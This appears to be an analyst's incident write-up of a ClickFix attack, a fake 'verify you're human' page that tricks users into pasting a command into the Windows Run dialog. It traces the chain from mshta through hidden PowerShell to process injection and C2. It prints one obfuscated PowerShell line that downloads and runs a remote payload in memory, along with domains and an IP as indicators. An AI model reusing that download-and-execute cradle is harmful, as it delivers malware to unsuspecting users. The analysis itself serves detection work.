ClickFix: A Fake CAPTCHA That Runs Malware For You

Summary: An EDR alert fired on a suspicious PowerShell process spawned through MSHTA. Pulling the thread revealed a textbook ClickFix attack — a fake "verify you're human" page that talks the user into pasting a malicious command into the Windows Run dialog. From there it downloaded a payload and injected code into svchost, beaconing out to a server in Russia.

What caught my eye

PowerShell launched by mshta.exe is the kind of parent/child pair that makes a SOC analyst sit up straight — legitimate software almost never does this. That single detection unravelled into one of the more clever social-engineering tricks going around right now: ClickFix. Instead of exploiting the machine, it exploits the person, convincing them to run the malware themselves under the guise of a CAPTCHA.

The lure

The user landed on a page that looked like a routine "prove you're not a robot" check. But rather than clicking images, it asked them to perform a few "verification steps" by hand — a dead giveaway once you know what you're looking at.

The paste

The page silently copied a command to the clipboard. Following the "steps" pastes it straight into the Run dialog — an mshta call to attacker infrastructure.

The execution chain

Once executed, mshta.exe spawned powershell.exe with a hidden window — exactly the alert that started this investigation.

TimeEDR event
2025-03-06 10:57:22mshta.exe created a process powershell.exe with a hidden window

That PowerShell stage downloaded and executed a follow-on payload directly in memory:

"powershell.exe" -c ([System.Net.WebClient]::New().DownloadString('https://pegas.durablyscrimmage[.]rent/awjxs.recaptcha'))|.( (GV She*d -ValueO)[1]+(ChildItem Variable:S*ell*d).Value[13]+'x')

It dropped a script-policy test artifact in the user's temp folder (C:\Users\<user>\AppData\Local\Temp\__PSScriptPolicyTest_hbqizdzd.jph.ps1) and performed a DNS lookup for usermahnualplatforms11[.]site.

Injection & command-and-control

The payload injected code into chrome.exe and svchost.exe, which then established an outbound connection to 89.110.95.20 over an uncommon port (1301) and ran a WMI query for processor info. The C2 IP geolocates to a hosting provider in the Russian Federation.
